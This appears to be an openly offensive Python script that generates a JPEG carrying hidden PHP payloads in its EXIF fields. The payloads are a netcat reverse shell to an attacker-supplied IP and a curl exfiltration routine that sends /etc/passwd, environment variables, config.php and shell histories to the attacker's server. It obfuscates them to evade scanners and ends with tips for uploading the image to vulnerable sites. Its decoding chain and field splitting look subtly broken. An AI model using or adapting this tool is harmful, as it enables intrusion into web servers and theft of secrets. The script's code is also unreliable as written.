from PIL import Image
import piexif
import base64
import socket
import os

print("Made By Taylor Christian Newsome — now way more fucked up 💀")

# Get attacker listener details
print("\n┌──[Evil JPEG Payload Generator]")
lhost = input("│   Enter your LHOST (attacker IP): ").strip() or "127.0.0.1"
lport = input("│   Enter your LPORT (attacker port): ").strip() or "4444"
print("└── Ready to cook something nasty...\n")

# Core reverse shell payload (bash reverse shell via nc)
rev_shell = f'<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f");'

# Exfil payload — steals common sensitive files + env + sends via curl to your server
# (assumes target can reach your HTTP server or use DNS exfil if firewall is tight)
exfil = f'''
<?php
$files = ["/etc/passwd","/proc/self/environ","/var/www/html/config.php","/home/*/.*history"];
$data = "";
foreach($files as $f){{if(file_exists($f)) $data .= file_get_contents($f)."\\n---\\n";}}
$data .= print_r($_SERVER,true)."\\n".getenv("PATH");
$ch = curl_init("http://{lhost}:8000/exfil");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
?>
'''

# Combine into one fat payload (executed when image is interpreted as PHP)
full_payload = rev_shell + exfil

# Obfuscate a bit — base64 + eval(gzinflate(strrev(base64)))
obf = base64.b64encode(full_payload.encode()).decode()
obf = f'<?php eval(gzinflate(strrev(base64_decode("{obf}")))); __HALT_COMPILER(); ?>'

# Split across multiple EXIF fields so single-field scanners miss it
exif_dict = {
    "0th": {
        piexif.ImageIFD.ImageDescription: obf[:1000].encode(),          # main chunk
        piexif.ImageIFD.XPComment: obf[1000:2000].encode(),            # unicode comment
        piexif.ImageIFD.XPTitle: "Totally innocent pic".encode(),
        piexif.ImageIFD.Software: obf[2000:].encode() + b"Adobe",      # leftover + fake legit
    },
    "Exif": {
        piexif.ExifIFD.UserComment: b"ASCII\0" + obf[:500].encode(),   # another hiding spot
    },
}

exif_bytes = piexif.dump(exif_dict)

# Create tiny black image
img = Image.new('RGB', (1337, 1337), color='black')

# Save with evil EXIF
img.save("ultimate_pwn.jpg", exif=exif_bytes)

print(f"\nEvil image created: ultimate_pwn.jpg")
print(f" - Reverse shell → nc {lhost} {lport}")
print(" - Exfils: passwd, env, config.php, history, server vars via curl to http://<your-ip>:8000/exfil")
print("Pro tip: run `python -m http.server 8000` on your box to catch the goodies")
print("Upload → hope misconfig lets .jpg execute PHP → profit 🩸")
